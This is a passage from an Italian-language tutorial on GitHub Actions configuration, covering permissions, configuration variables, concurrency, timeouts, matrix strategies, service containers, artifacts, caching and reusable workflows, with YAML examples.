      echo "/usr/local/custom/bin" >> "$GITHUB_PATH"

  - name: Use dynamic variable
    run: echo "Version is $VERSION"

  - name: Multiline environment variable
    run: |
      echo "CONFIG<<EOF" >> "$GITHUB_ENV"
      cat config.json >> "$GITHUB_ENV"
      echo "EOF" >> "$GITHUB_ENV"

  - name: Job summary
    run: |
      echo "## Build Results" >> "$GITHUB_STEP_SUMMARY"
      echo "- Version: $VERSION" >> "$GITHUB_STEP_SUMMARY"
      echo "- Status: :white_check_mark: Success" >> "$GITHUB_STEP_SUMMARY"
```

---

## Default Shell e Working Directory

```yaml
# Default globali per tutti i job
defaults:
  run:
    shell: bash
    working-directory: ./app

jobs:
  build:
    runs-on: ubuntu-latest
    # Override a livello di job
    defaults:
      run:
        shell: bash
        working-directory: ./backend

    steps:
      - name: Uses job defaults
        run: pwd  # Esegue in ./backend con bash

      - name: Override at step level
        shell: python
        working-directory: ./scripts
        run: |
          import os
          print(os.getcwd())

      # Shell disponibili:
      # bash: bash --noprofile --norc -eo pipefail {0}
      # pwsh: PowerShell Core
      # python: python {0}
      # sh: sh -e {0}
      # cmd: Windows cmd
      # powershell: Windows PowerShell

      - name: Custom shell
        shell: bash {0}  # Senza -e (non esce su errore)
        run: |
          command_that_might_fail || true
          echo "Continuato comunque"
```

---

## Permissions

### Configurazione dei Permessi

```yaml
# Workflow-level: default per tutti i job
permissions:
  contents: read
  pull-requests: write
  issues: write
  packages: write
  security-events: write

jobs:
  analyze:
    # Job-level: override per questo job
    permissions:
      security-events: write
      contents: read
    runs-on: ubuntu-latest
    steps: [...]

  deploy:
    permissions:
      contents: read
      id-token: write    # Per OIDC (AWS, Azure, GCP)
    runs-on: ubuntu-latest
    steps: [...]
```

### Permessi Disponibili

| Permesso | Descrizione |
|----------|-------------|
| `actions` | Gestione dei workflow |
| `contents` | Lettura/scrittura del repository |
| `issues` | Gestione delle issue |
| `packages` | Pubblicazione pacchetti |
| `pull-requests` | Gestione delle PR |
| `security-events` | Upload SARIF, code scanning |
| `statuses` | Commit status |
| `id-token` | OIDC token per cloud auth |
| `deployments` | Gestione dei deployment |
| `pages` | Deploy GitHub Pages |
| `checks` | Gestione dei check runs |

```yaml
# Permesso minimo: solo lettura
permissions: read-all

# Nessun permesso
permissions: {}

# Principio del minimo privilegio: specificare solo ciò che serve
permissions:
  contents: read
  packages: write
```

### Modalita di Default dei Permessi

A livello di organizzazione e repository, GitHub offre due modalita di default per il `GITHUB_TOKEN`:

| Modalita | Comportamento | Quando Usarla |
|---|---|---|
| **Permissive** (legacy) | Il token ha permessi `read` e `write` su tutti gli scope | Retrocompatibilita con workflow esistenti |
| **Restricted** (raccomandata) | Il token ha solo `contents: read` e `metadata: read` | Nuovi repository, organizzazioni security-aware |

Per i nuovi repository, GitHub imposta `restricted` come default. Questo significa che se un workflow necessita di scrivere su PR, issues, packages o altre risorse, deve dichiarare esplicitamente i permessi nel file YAML. Questo e il comportamento raccomandato perche applica il principio del minimo privilegio.

#### Permesso attestations

A partire dal 2025, GitHub ha introdotto il permesso `attestations: write` per supportare la generazione di attestazioni di artefatti (artifact attestations). Questa funzionalita permette di firmare e verificare artefatti prodotti dai workflow, creando una catena di fiducia tracciabile dalla build alla distribuzione:

```yaml
permissions:
  contents: read
  id-token: write
  attestations: write      # Necessario per generare artifact attestations

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

      - name: Generate SBOM
        run: npx @cyclonedx/cyclonedx-npm --output-file sbom.json

      - name: Attest build artifacts
        uses: actions/attest-build-provenance@v2
        with:
          subject-path: 'dist/**'
```

#### Permessi e GITHUB_TOKEN come Riduzione della Superficie di Attacco

Quando si specifica `permissions: {}` (oggetto vuoto), il `GITHUB_TOKEN` viene emesso ma con **zero permessi**. Questo e utile per job che non necessitano di interagire con le API GitHub e che utilizzano solo credenziali esterne (OIDC, secret custom):

```yaml
jobs:
  external-deploy:
    permissions: {}              # Il GITHUB_TOKEN non ha alcun permesso
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4     # Checkout funziona comunque (usa il token internamente per clone)
      - name: Deploy via OIDC
        run: ./deploy-to-aws.sh
        env:
          AWS_ROLE_ARN: ${{ vars.AWS_ROLE_ARN }}
```

---

## Configuration Variables (vars)

Le configuration variables (`vars`) sono variabili di configurazione non segrete che possono essere definite a livello di organizzazione, repository e environment. A differenza dei `secrets`, i valori delle `vars` sono visibili in chiaro nei log e nella UI di GitHub.

### Definizione e Scope

Le configuration variables vengono definite dalla UI di GitHub (Settings > Secrets and variables > Actions > Variables) e sono accessibili tramite il context `vars`:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - name: Configure application
        run: |
          echo "API URL: ${{ vars.API_URL }}"
          echo "Log level: ${{ vars.LOG_LEVEL }}"
          echo "Feature flags: ${{ vars.FEATURE_FLAGS }}"
        # I valori sono visibili in chiaro nei log (non mascherati)
```

### Gerarchia e Precedenza

Le configuration variables seguono una gerarchia di precedenza identica a quella dei secret. Quando una variabile con lo stesso nome esiste a piu livelli, il livello piu specifico vince:

| Livello | Precedenza | Dove Definirla |
|---|---|---|
| **Environment** | Piu alta (vince su tutto) | Settings > Environments > [nome] > Variables |
| **Repository** | Media | Settings > Secrets and variables > Actions > Variables |
| **Organization** | Piu bassa (fallback) | Organization Settings > Secrets and variables > Actions > Variables |

```yaml
# Esempio: API_URL definita a tutti e tre i livelli
# - Organization: https://api.default.example.com
# - Repository: https://api.myapp.example.com
# - Environment (staging): https://api.staging.example.com

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: echo "${{ vars.API_URL }}"
        # Output: https://api.staging.example.com (l'environment vince)

  build:
    runs-on: ubuntu-latest
    # Nessun environment specificato
    steps:
      - run: echo "${{ vars.API_URL }}"
        # Output: https://api.myapp.example.com (il repository vince sull'organization)
```

### Differenza tra vars, env e secrets

| Aspetto | `vars` | `env` | `secrets` |
|---|---|---|---|
| **Definizione** | UI GitHub (Settings) | YAML del workflow | UI GitHub (Settings) |
| **Visibilita nei log** | In chiaro | In chiaro | Mascherato (`***`) |
| **Modifica** | UI o API senza commit | Richiede commit sul workflow file | UI o API senza commit |
| **Scope** | Org / Repo / Environment | Workflow / Job / Step | Org / Repo / Environment |
| **Accesso** | `${{ vars.NAME }}` | `${{ env.NAME }}` o `$NAME` | `${{ secrets.NAME }}` |
| **Caso d'uso** | URL, flag, configurazioni non segrete | Valori calcolati, costanti del workflow | Token, password, chiavi API |
| **Limite dimensione** | 48 KB per variabile | Nessun limite formale | 48 KB per secret |
| **Numero massimo** | 100 per livello | Nessun limite formale | 100 per livello |

### Quando Usare vars vs env

La scelta tra `vars` e `env` dipende da chi deve poter modificare il valore e con quale frequenza:

- **Usare `vars`** quando il valore deve essere modificabile senza un commit (ad esempio, URL di API che cambiano tra ambienti, feature flag, soglie di configurazione).
- **Usare `env`** quando il valore e strettamente legato alla logica del workflow e dovrebbe essere versionato nel repository (ad esempio, versione di Node.js, flag di build, nomi di artefatti).

```yaml
env:
  NODE_VERSION: '20'                          # Versionato nel workflow: raro cambio
  CI: 'true'                                  # Costante del workflow

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
      - run: |
          # vars: gestiti dalla UI, modificabili senza commit
          curl -X POST "${{ vars.WEBHOOK_URL }}" \
            -d '{"status": "build_started", "env": "${{ vars.DEPLOY_ENV }}"}'
```

---

## Concurrency

### Configurazione

```yaml
# Impedire esecuzioni parallele dello stesso workflow sullo stesso branch
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# Pattern per PR: cancellare esecuzioni precedenti
concurrency:
  group: pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true

# Pattern per deploy: non cancellare, accodare
concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: false

# Per ambiente specifico
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

### Concurrency a Livello di Job

La concorrenza puo essere configurata anche a livello di singolo job, permettendo strategie diverse per job diversi nello stesso workflow:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    # I test possono essere cancellati se arriva un nuovo push
    concurrency:
      group: test-${{ github.ref }}
      cancel-in-progress: true
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    # I deploy NON devono essere cancellati (rischio stato inconsistente)
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - run: ./deploy.sh
```

### Pattern di Concurrency per Scenari Comuni

| Scenario | Group | cancel-in-progress | Motivazione |
|---|---|---|---|
| CI su PR | `ci-${{ github.event.pull_request.number }}` | `true` | Nuovi push invalidano i test precedenti |
| CI su push main | `ci-${{ github.ref }}` | `true` | Solo l'ultimo commit conta |
| Deploy staging | `deploy-staging` | `true` | Lo staging puo essere sovrascritto |
| Deploy production | `deploy-production` | `false` | Mai interrompere un deploy in corso |
| Release | `release-${{ github.ref_name }}` | `false` | Ogni release deve completarsi |
| Cron nightly | `nightly-${{ github.workflow }}` | `false` | I report devono finire |

---

## Timeout e Continue-on-Error

### Timeout dei Job

Ogni job in GitHub Actions ha un timeout massimo di default di **360 minuti (6 ore)**. Per evitare che job bloccati o in stallo consumino risorse (e minuti di fatturazione) inutilmente, e fondamentale configurare timeout espliciti sia a livello di job che di singolo step.

#### timeout-minutes a Livello di Job

La chiave `timeout-minutes` a livello di job definisce la durata massima complessiva per l'intero job. Se il job non si completa entro il tempo specificato, viene cancellato automaticamente e lo stato risultante e `failure`:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30        # Il job fallisce se supera 30 minuti
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run build

  e2e-tests:
    runs-on: ubuntu-latest
    timeout-minutes: 60        # E2E tests possono essere lenti
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npx playwright test

  quick-lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5         # Lint dovrebbe essere rapido
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint
```

#### timeout-minutes a Livello di Step

Oltre al timeout del job, ogni singolo step puo avere il proprio timeout. Questo e utile quando un job contiene operazioni con tempi attesi molto diversi:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 45              # Timeout complessivo del job
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        timeout-minutes: 5            # L'installazione non dovrebbe superare 5 min
        run: npm ci

      - name: Run unit tests
        timeout-minutes: 10           # I test unitari entro 10 min
        run: npm test

      - name: Build application
        timeout-minutes: 15           # La build puo richiedere piu tempo
        run: npm run build

      - name: Deploy to cloud
        timeout-minutes: 10
        run: ./deploy.sh
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

      - name: Health check post-deploy
        timeout-minutes: 3            # Il health check deve rispondere velocemente
        run: |
          for i in $(seq 1 18); do
            HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://app.example.com/health)
            if [ "$HTTP_STATUS" = "200" ]; then
              echo "Servizio attivo e funzionante"
              exit 0
            fi
            echo "Tentativo $i: HTTP $HTTP_STATUS, riprovo tra 10s..."
            sleep 10
          done
          echo "::error::Health check fallito dopo 3 minuti"
          exit 1
```

#### Relazione tra Timeout di Job e Step

Il timeout dello step e sempre limitato dal timeout del job. Se un job ha `timeout-minutes: 20` e uno step ha `timeout-minutes: 30`, lo step verra comunque interrotto quando il job raggiunge i suoi 20 minuti. La regola e: **il timeout piu restrittivo vince**.

| Configurazione | Timeout Job | Timeout Step | Timeout Effettivo Step |
|---|---|---|---|
| Solo job timeout | 30 min | (nessuno) | 30 min (limitato dal job) |
| Solo step timeout | 360 min (default) | 10 min | 10 min |
| Entrambi specificati | 20 min | 10 min | 10 min |
| Step > Job | 15 min | 30 min | 15 min (limitato dal job) |

#### Timeout Raccomandati per Tipo di Operazione

| Operazione | Timeout Suggerito | Motivazione |
|---|---|---|
| Lint / format check | 5-10 min | Operazione veloce; se ci mette di piu, qualcosa non va |
| Unit test | 10-15 min | Variabile in base alla dimensione della suite |
| Integration test | 15-30 min | Include startup di servizi e connessioni |
| E2E test (Playwright, Cypress) | 30-60 min | Browser test sono intrinsecamente piu lenti |
| Build applicazione | 10-20 min | Dipende dalla complessita del progetto |
| Deploy | 10-15 min | Include verifica post-deploy |
| Docker build + push | 15-30 min | Layer caching influenza molto il tempo |

### Continue-on-Error

La chiave `continue-on-error` permette di far proseguire l'esecuzione anche quando un job o uno step fallisce. Per default, qualsiasi fallimento interrompe l'esecuzione e marca il workflow come `failure`.

#### continue-on-error a Livello di Step

Quando impostato su uno step, se quello step fallisce, gli step successivi continuano l'esecuzione. Lo step fallito avra `outcome: failure` ma `conclusion: success`, permettendo al job complessivo di avere successo:

```yaml
jobs:
  quality-checks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Lint (non bloccante)
        continue-on-error: true     # Il lint puo fallire senza bloccare il workflow
        run: npm run lint

      - name: Type check (non bloccante)
        continue-on-error: true
        run: npx tsc --noEmit

      - name: Test (bloccante)
        run: npm test                # I test DEVONO passare

      - name: Build (bloccante)
        run: npm run build           # La build DEVE avere successo
```

#### continue-on-error a Livello di Job

A livello di job, `continue-on-error: true` permette al workflow di considerarsi "completato con successo" anche se quel job fallisce. I job dipendenti (con `needs`) vedranno il risultato come `success`:

```yaml
jobs:
  experimental-test:
    runs-on: ubuntu-latest
    continue-on-error: true         # Il fallimento non blocca il workflow
    steps:
      - uses: actions/checkout@v4
      - run: npm run test:experimental

  deploy:
    needs: experimental-test
    runs-on: ubuntu-latest
    # Questo job si esegue anche se experimental-test fallisce
    # perche continue-on-error: true sul job lo marca come "success"
    steps:
      - run: echo "Deploying..."
```

#### continue-on-error Dinamico con fromJSON

Un pattern molto utile consiste nell'usare `continue-on-error` dinamicamente in combinazione con una strategy matrix. Questo permette di tollerare il fallimento solo per combinazioni sperimentali:

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest]
        node-version: [18, 20, 22]
        include:
          # Node 22 e ancora sperimentale: il fallimento e tollerato
          - node-version: 22
            experimental: true
          # Le altre combinazioni NON sono sperimentali (default: false/null)

    # continue-on-error solo per le combinazioni sperimentali
    continue-on-error: ${{ matrix.experimental == true }}

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
      - run: npm ci
      - run: npm test
```

Con questo pattern, il fallimento di Node 22 non blocca il workflow, mentre il fallimento di Node 18 o 20 causa un errore legittimo.

#### Differenza tra outcome e conclusion

Quando `continue-on-error: true` e attivo, e importante capire la differenza tra `outcome` e `conclusion` nello `steps` context:

| Proprieta | Senza continue-on-error | Con continue-on-error |
|---|---|---|
| `steps.<id>.outcome` | `success` o `failure` | `success` o `failure` |
| `steps.<id>.conclusion` | Uguale a `outcome` | Sempre `success` (anche se lo step fallisce) |

Questo significa che per controllare se uno step con `continue-on-error` e effettivamente fallito, bisogna usare `outcome`, non `conclusion`:

```yaml
steps:
  - name: Lint
    id: lint
    continue-on-error: true
    run: npm run lint

  - name: Report lint status
    run: |
      if [ "${{ steps.lint.outcome }}" = "failure" ]; then
        echo "::warning::Il linting ha trovato problemi, ma non e bloccante"
      fi

  - name: Only on lint success
    if: steps.lint.outcome == 'success'
    run: echo "Lint pulito!"
```

### Combinare Timeout e Continue-on-Error

Un pattern avanzato combina entrambe le chiavi per gestire operazioni che possono essere lente e non critiche:

```yaml
jobs:
  full-suite:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4

      # Test rapidi: bloccanti con timeout stretto
      - name: Unit tests
        timeout-minutes: 10
        run: npm run test:unit

      # Test lenti e opzionali: non bloccanti con timeout ampio
      - name: Performance benchmarks (opzionale)
        timeout-minutes: 20
        continue-on-error: true
        run: npm run test:perf

      # Upload risultati indipendentemente dall'esito dei benchmark
      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: results/
```

---

## Strategy Matrix Dettagliata

La strategia matrix permette di eseguire varianti di un job in parallelo, testando combinazioni di sistemi operativi, versioni del linguaggio, database e qualsiasi altra variabile.

### Matrice Base

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node-version: [18, 20, 22]
        # Genera 3 x 3 = 9 combinazioni
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
      - run: npm ci
      - run: npm test
```

### Include: Aggiungere Combinazioni Specifiche

La parola chiave `include` aggiunge configurazioni extra alla matrice, oppure estende combinazioni esistenti con proprieta aggiuntive:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node-version: [18, 20]
    include:
      # Aggiungere una combinazione che non esiste nella matrice base
      - os: macos-latest
        node-version: 22
        experimental: true

      # Estendere una combinazione esistente con proprieta aggiuntive
      - os: ubuntu-latest
        node-version: 20
        coverage: true          # Proprieta custom disponibile come ${{ matrix.coverage }}
        upload-report: true

      # Aggiungere variabile solo per specifiche combinazioni
      - os: windows-latest
        node-version: 18
        npm-args: '--legacy-peer-deps'
```

### Exclude: Rimuovere Combinazioni

L'`exclude` rimuove combinazioni specifiche dalla matrice. Utile quando certe combinazioni sono note per essere incompatibili:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node-version: [16, 18, 20, 22]
    exclude:
      # Node 16 non e supportato su macOS ARM64
      - os: macos-latest
        node-version: 16
      # Saltare Windows + Node 16 per risparmiare minuti
      - os: windows-latest
        node-version: 16
```

### fail-fast e max-parallel

```yaml
strategy:
  # Se true (default), tutti i job vengono cancellati quando uno fallisce
  # Se false, tutti i job continuano anche se uno fallisce
  fail-fast: false

  # Limita il numero di job paralleli
  # Utile con self-hosted runner limitati o API con rate limiting
  max-parallel: 3

  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node-version: [18, 20, 22]
```

### Matrice Dinamica con fromJSON

Una tecnica avanzata consiste nel generare la matrice dinamicamente usando `fromJSON()`. Questo permette di calcolare le combinazioni in un job precedente e passarle come output:

```yaml
jobs:
  # Job 1: calcola quali moduli sono cambiati
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - id: set-matrix
        run: |
          # Trova i moduli modificati rispetto al branch base
          CHANGED=$(git diff --name-only origin/main...HEAD | \
            grep -oP '^packages/\K[^/]+' | sort -u | \
            jq -R -s 'split("\n") | map(select(length > 0))' )

          # Se nessun modulo e cambiato, usa un fallback
          if [ "$CHANGED" = "[]" ]; then
            CHANGED='["core"]'
          fi

          echo "matrix={\"module\":$CHANGED}" >> "$GITHUB_OUTPUT"

  # Job 2: testa solo i moduli modificati
  test:
    needs: detect-changes
    runs-on: ubuntu-latest
    strategy:
      matrix: ${{ fromJSON(needs.detect-changes.outputs.matrix) }}
    steps:
      - uses: actions/checkout@v4
      - run: |
          echo "Testing module: ${{ matrix.module }}"
          cd packages/${{ matrix.module }}
          npm ci && npm test
```

### Matrice Complessa Multi-Dimensionale

```yaml
jobs:
  integration-test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, ubuntu-22.04]
        python-version: ['3.10', '3.11', '3.12']
        database: [postgres, mysql, sqlite]
        include:
          # Solo su Ubuntu latest con Python 3.12, testa anche MongoDB
          - os: ubuntu-latest
            python-version: '3.12'
            database: mongodb
            experimental: true
        exclude:
          # MySQL con Python 3.10 ha problemi noti
          - python-version: '3.10'
            database: mysql

    # Permetti il fallimento delle combinazioni sperimentali
    continue-on-error: ${{ matrix.experimental == true }}

    services:
      db:
        image: ${{ matrix.database == 'postgres' && 'postgres:16' || matrix.database == 'mysql' && 'mysql:8' || '' }}
        env:
          POSTGRES_PASSWORD: ${{ matrix.database == 'postgres' && 'testpassword' || '' }}
          MYSQL_ROOT_PASSWORD: ${{ matrix.database == 'mysql' && 'testpassword' || '' }}

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      - run: pip install -r requirements.txt
      - run: pytest --db=${{ matrix.database }}
```

---

## Service Containers

I service container permettono di avviare servizi Docker (database, cache, message broker) come sidecar del job, connessi automaticamente alla rete del runner.

### PostgreSQL e Redis per Test di Integrazione

```yaml
jobs:
  integration-tests:
    runs-on: ubuntu-latest

    services:
      # PostgreSQL come database per i test
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: testuser
          POSTGRES_PASSWORD: testpassword
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        # Health check per attendere che il database sia pronto
        options: >-
          --health-cmd="pg_isready -U testuser -d testdb"
          --health-interval=10s
          --health-timeout=5s
          --health-retries=5
          --health-start-period=30s

      # Redis come cache per i test
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
        options: >-
          --health-cmd="redis-cli ping"
          --health-interval=10s
          --health-timeout=5s
          --health-retries=5

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - name: Run integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://testuser:testpassword@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379
```

### Service Container in Job Container

Quando il job stesso gira in un container Docker, i service container sono accessibili tramite il nome del servizio (DNS interno alla rete Docker), non tramite `localhost`:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    # Il job gira dentro un container
    container:
      image: node:20-slim
      options: --user root

    services:
      db:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: secret
        # Nessun mapping di porta necessario: si usa il DNS interno
        # Il servizio e raggiungibile come "db:5432"

      cache:
        image: redis:7-alpine
        # Raggiungibile come "cache:6379"

    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - name: Test con connessione ai servizi
        run: npm test
        env:
          # Nota: "db" e "cache" invece di "localhost"
          DATABASE_URL: postgresql://postgres:secret@db:5432/postgres
          REDIS_URL: redis://cache:6379
```

### Servizi Aggiuntivi: Elasticsearch, RabbitMQ, MinIO

```yaml
services:
  elasticsearch:
    image: elasticsearch:8.12.0
    env:
      discovery.type: single-node
      xpack.security.enabled: 'false'
      ES_JAVA_OPTS: '-Xms512m -Xmx512m'
    ports:
      - 9200:9200
    options: >-
      --health-cmd="curl -f http://localhost:9200/_cluster/health || exit 1"
      --health-interval=15s
      --health-timeout=10s
      --health-retries=10
      --health-start-period=60s

  rabbitmq:
    image: rabbitmq:3-management-alpine
    ports:
      - 5672:5672
      - 15672:15672
    options: >-
      --health-cmd="rabbitmq-diagnostics check_running"
      --health-interval=10s
      --health-timeout=5s
      --health-retries=5

  minio:
    image: minio/minio:latest
    env:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    ports:
      - 9000:9000
    options: >-
      --health-cmd="mc ready local || exit 1"
      --health-interval=10s
      --health-timeout=5s
      --health-retries=5
```

---

## Artifacts e Caching

### Upload di Artefatti

Gli artefatti permettono di salvare file prodotti da un job e condividerli con altri job o scaricarli dalla UI di GitHub:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: |
            dist/
            !dist/**/*.map     # Escludi source map
          retention-days: 7    # Conserva per 7 giorni (default: 90)
          compression-level: 6 # 0-9, default 6 (0 = nessuna compressione)
          if-no-files-found: error  # warn, ignore, error
```

### Download di Artefatti tra Job

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: webapp
          path: dist/

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Download build output
        uses: actions/download-artifact@v4
        with:
          name: webapp
          path: ./deploy-target/

      - name: Deploy
        run: |
          ls -la ./deploy-target/
          # Il contenuto di dist/ e ora in ./deploy-target/
          ./deploy.sh ./deploy-target/
```

### Upload di Artefatti Multipli

```yaml
steps:
  - name: Upload test results
    if: always()   # Carica anche se i test falliscono
    uses: actions/upload-artifact@v4
    with:
      name: test-results-${{ matrix.os }}-node${{ matrix.node-version }}
      path: |
        test-results/
        coverage/
      retention-days: 14

  - name: Download all artifacts
    uses: actions/download-artifact@v4
    with:
      # Senza 'name', scarica TUTTI gli artefatti
      path: all-artifacts/
      # Ogni artefatto in una sottodirectory con il suo nome
```

### Caching delle Dipendenze

Il caching e fondamentale per velocizzare i workflow. L'action `actions/cache` salva e ripristina directory tra esecuzioni diverse:

```yaml
steps:
  - uses: actions/checkout@v4

  # Caching esplicito con actions/cache
  - name: Cache node_modules
    id: cache-deps
    uses: actions/cache@v4
    with:
      path: node_modules
      key: deps-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
      restore-keys: |
        deps-${{ runner.os }}-

  # Installare le dipendenze solo se la cache non e valida
  - name: Install dependencies
    if: steps.cache-deps.outputs.cache-hit != 'true'
    run: npm ci
```

#### Strategie di Caching per Diversi Ecosistemi

```yaml
# Python con pip
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('**/requirements.txt', '**/requirements-dev.txt') }}
    restore-keys: pip-${{ runner.os }}-

# Go modules
- uses: actions/cache@v4
  with:
    path: |
      ~/.cache/go-build
      ~/go/pkg/mod
    key: go-${{ runner.os }}-${{ hashFiles('**/go.sum') }}
    restore-keys: go-${{ runner.os }}-

# Rust con cargo
- uses: actions/cache@v4
  with:
    path: |
      ~/.cargo/bin/
      ~/.cargo/registry/index/
      ~/.cargo/registry/cache/
      ~/.cargo/git/db/
      target/
    key: cargo-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}
    restore-keys: cargo-${{ runner.os }}-

# Gradle
- uses: actions/cache@v4
  with:
    path: |
      ~/.gradle/caches
      ~/.gradle/wrapper
    key: gradle-${{ runner.os }}-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
    restore-keys: gradle-${{ runner.os }}-
```

#### Caching Integrato nelle Setup Actions

Molte setup actions hanno il caching integrato, eliminando la necessita di configurare `actions/cache` separatamente:

```yaml
# Node.js con cache integrata
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: 'npm'           # oppure 'yarn' o 'pnpm'
    cache-dependency-path: '**/package-lock.json'

# Python con cache integrata
- uses: actions/setup-python@v5
  with:
    python-version: '3.12'
    cache: 'pip'
    cache-dependency-path: '**/requirements*.txt'

# Go con cache integrata
- uses: actions/setup-go@v5
  with:
    go-version: '1.22'
    cache: true
```

### Retention Policy e Gestione dello Storage

| Piano GitHub | Retention di default | Retention massima | Storage incluso |
|---|---|---|---|
| Free | 90 giorni | 90 giorni | 500 MB |
| Pro | 90 giorni | 90 giorni | 1 GB |
| Team | 90 giorni | 90 giorni | 2 GB |
| Enterprise | 90 giorni | 400 giorni | 50 GB |

Per repository con CI/CD attiva, e fondamentale gestire attivamente la retention:

```yaml
# Ridurre la retention per artefatti temporanei
- uses: actions/upload-artifact@v4
  with:
    name: ephemeral-logs
    path: logs/
    retention-days: 1     # Solo 1 giorno per log di debug

# Artefatti importanti: retention piu lunga
- uses: actions/upload-artifact@v4
  with:
    name: release-binaries
    path: release/
    retention-days: 90    # Massimo per piano Free
```

---

## Reusable Workflows e Composite Actions

### Reusable Workflow con workflow_call

I reusable workflow permettono di definire un workflow completo (con job, step, servizi) e richiamarlo da altri workflow come se fosse una funzione:

```yaml
# .github/workflows/reusable-deploy.yml
name: Reusable Deploy

on:
  workflow_call:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: string
      version:
        description: 'Version to deploy'
        required: true
        type: string
      dry_run:
        description: 'Run in dry-run mode'
        required: false
        type: boolean
        default: false
    outputs:
      deploy_url:
        description: 'URL of the deployed application'
        value: ${{ jobs.deploy.outputs.url }}
    secrets:
      DEPLOY_TOKEN:
        required: true
      SLACK_WEBHOOK:
        required: false

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.deploy.outputs.url }}
    steps:
      - uses: actions/checkout@v4

      - name: Deploy application
        id: deploy
        run: |
          if [ "${{ inputs.dry_run }}" = "true" ]; then
            echo "DRY RUN: would deploy ${{ inputs.version }} to ${{ inputs.environment }}"
            echo "url=https://dry-run.example.com" >> "$GITHUB_OUTPUT"
          else
            ./deploy.sh "${{ inputs.version }}" "${{ inputs.environment }}"
            echo "url=https://${{ inputs.environment }}.example.com" >> "$GITHUB_OUTPUT"
          fi
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

      - name: Notify on Slack
        if: always() && secrets.SLACK_WEBHOOK != ''
        run: |
          curl -X POST "${{ secrets.SLACK_WEBHOOK }}" \
            -H 'Content-Type: application/json' \
            -d "{\"text\": \"Deploy ${{ inputs.version }} to ${{ inputs.environment }}: ${{ job.status }}\"}"
```

### Workflow Chiamante

```yaml
# .github/workflows/release.yml
name: Release Pipeline

on:
  push:
    tags: ['v*.*.*']

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  deploy-staging:
    needs: test
    uses: ./.github/workflows/reusable-deploy.yml
    with:
